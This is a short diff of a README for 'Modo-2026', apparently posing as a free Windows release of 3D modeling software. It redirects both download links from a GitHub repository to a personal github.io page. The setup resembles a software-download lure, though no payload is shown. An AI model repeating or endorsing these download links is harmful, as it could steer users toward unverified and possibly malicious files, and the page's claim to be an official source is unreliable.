@@ -1,6 +1,6 @@
 # 🎨 Modo-2026 - Powerful 3D Modeling for Windows
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rajbi6198/Modo-2026)
+[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://rajbi6198.github.io)
 
 ## What is Modo-2026?
 
@@ -38,7 +38,7 @@ The software combines modeling, texturing, and rendering capabilities in one pac
 
 Visit the official repository to download the latest version:
 
-**[https://github.com/Rajbi6198/Modo-2026](https://github.com/Rajbi6198/Modo-2026)**
+**[https://rajbi6198.github.io](https://rajbi6198.github.io)**
 
 Click the green "Code" button on the repository page. Select "Download ZIP" from the menu. Save the file to a location you can find easily, such as your Desktop or Downloads folder.
 
